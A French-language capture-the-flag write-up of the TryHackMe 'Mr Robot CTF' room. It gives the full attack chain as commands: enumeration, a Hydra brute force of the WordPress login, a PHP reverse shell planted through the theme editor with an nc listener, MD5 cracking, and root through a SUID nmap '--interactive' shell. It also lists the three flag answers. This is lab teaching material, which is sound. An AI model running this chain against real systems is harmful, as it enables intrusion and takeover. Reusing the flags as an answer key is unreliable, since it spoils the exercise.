# TryHackMe: Mr Robot CTF

**Objectif :** enumerer un site WordPress cache, exploiter les informations laissees dans `robots.txt`, utiliser le dictionnaire `fsocity.dic` pour obtenir les identifiants WordPress, injecter un reverse shell via l'editeur de theme, devenir l'utilisateur `robot` en cassant un hash MD5, puis elever les privileges via un vieux `nmap` SUID.

---

## Introduction

La room **Mr Robot CTF** est devenue un classique parce qu'elle assemble plusieurs techniques tres utiles :

- enumeration web
- observation de `robots.txt`
- reutilisation d'un dictionnaire divulgue par la cible
- brute force WordPress
- webshell via edition de theme
- cassage de hash local
- privesc via GTFOBins

La room demande trois cles. Je reprends toute la progression qui y mene.

---

## Enumeration initiale

Je commence avec un scan Nmap :

```bash
nmap -sC -sV -Pn <IP>
```

Le scan remonte :

- `80/tcp` - HTTP
- `443/tcp` - HTTPS

Le port `22` est generalement ferme sur cette machine, ce qui force a passer par le web.

En ouvrant le site, on tombe sur une interface stylisee Mr Robot. Le rendu est original, mais pour la progression offensive, il faut revenir aux fondamentaux : enumeration de fichiers et repertoires.

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

L'un des premiers fichiers interessants est :

```text
/robots.txt
```

---

## robots.txt, dictionnaire et premiere cle

Le contenu de `robots.txt` est fondamental :

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Je recupere donc ces deux ressources.

```bash
curl http://<IP>/key-1-of-3.txt
curl -O http://<IP>/fsocity.dic
```

### Key 1

La premiere cle est directement exposee :

```text
073403c8a58a1f80d943455fb30724b9
```

### Reponse

**key 1:** `073403c8a58a1f80d943455fb30724b9`

### Pourquoi `fsocity.dic` compte autant

Le fichier `fsocity.dic` est une enorme wordlist. Il contient :

- des doublons
- des noms propres
- des termes lies a la serie

Je commence donc par la reduire :

```bash
sort fsocity.dic | uniq > fsocity-uniq.txt
wc -l fsocity.dic fsocity-uniq.txt
```

Cette deduplication fait tomber la wordlist a une taille beaucoup plus raisonnable.

---

## Enumeration WordPress

L'enumeration web revele tres vite une installation WordPress, notamment avec :

- `/wp-login.php`
- `/wp-admin/`
- du contenu typique dans les chemins et assets

Je peux utiliser `wpscan` :

```bash
wpscan --url http://<IP>/ -e u
```

Ou exploiter le comportement du formulaire de login pour identifier un utilisateur valide. L'utilisateur utile est :

```text
elliot
```

comme nom d'utilisateur utile.

---

## Bruteforce WordPress

J'utilise Hydra contre `wp-login.php` avec l'utilisateur `elliot` et la wordlist dedupliquee.

```bash
hydra -l elliot -P fsocity-uniq.txt <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"
```

Le mot de passe recupere est :

```text
ER28-0652
```

Une fois authentifie sur WordPress, je peux utiliser l'editeur de theme.

---

## Exploitation: reverse shell via 404.php

Depuis l'admin WordPress :

- `Appearance`
- `Editor`
- theme `twentyfifteen`
- fichier `404.php`

Je remplace son contenu par un reverse shell PHP.

Je prepare mon listener :

```bash
rlwrap nc -lvnp 4444
```

Puis je declenche l'execution en visitant une page 404 ou directement le chemin selon le theme.

Le shell obtenu tourne en tant que :

```text
daemon
```

Je le stabilise ensuite :

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Vers robot et key 2

Dans `/home/robot`, je trouve deux fichiers :

- `key-2-of-3.txt`
- `password.raw-md5`

Je peux lire le second, mais pas le premier.

```bash
cat /home/robot/password.raw-md5
```

Contenu :

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Je casse le hash :

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hash
john robot.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

Le mot de passe trouve est :

```text
abcdefghijklmnopqrstuvwxyz
```

Je bascule alors :

```bash
su robot
```

Puis je lis la seconde cle :

```bash
cat /home/robot/key-2-of-3.txt
```

### Reponse

**key 2:** `822c73956184f694993bede3eb39f959`

---

## Privilege Escalation: nmap interactif

Je cherche les binaires SUID :

```bash
find / -user root -perm -4000 2>/dev/null
```

L'element anormal est :

```text
/usr/local/bin/nmap
```

Il s'agit ici d'une vieille version supportant encore :

```text
--interactive
```

Je l'exploite :

```bash
/usr/local/bin/nmap --interactive
```

Puis, dans l'invite `nmap>` :

```text
!sh
```

J'obtiens alors un shell root.

Je confirme :

```bash
whoami
```

Puis je lis la troisieme cle :

```bash
cat /root/key-3-of-3.txt
```

### Reponse

**key 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## Resume des reponses de la room

- What is key 1? `073403c8a58a1f80d943455fb30724b9`
- What is key 2? `822c73956184f694993bede3eb39f959`
- What is key 3? `04787ddef27c3dee1ee161b21670b4e4`

---

## Commandes importantes

### Fichier robots

```bash
curl http://<IP>/robots.txt
```

Point de depart de toute la machine.

### Deduplication du dictionnaire

```bash
sort fsocity.dic | uniq > fsocity-uniq.txt
```

Rend le bruteforce utilisable.

### Crack MD5

```bash
john robot.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

Permet d'acceder a `robot`.

### nmap interactif

```bash
/usr/local/bin/nmap --interactive
!sh
```

Privesc finale via GTFOBins.

---

## Conclusion

**Mr Robot CTF** reste une room culte pour une bonne raison : elle apprend a transformer des fuites tres simples en compromission complete. Un `robots.txt` trop bavard, un dictionnaire public et un vieux binaire SUID suffisent a faire toute la difference.

***Auteur*** *: Saad Idrissi*
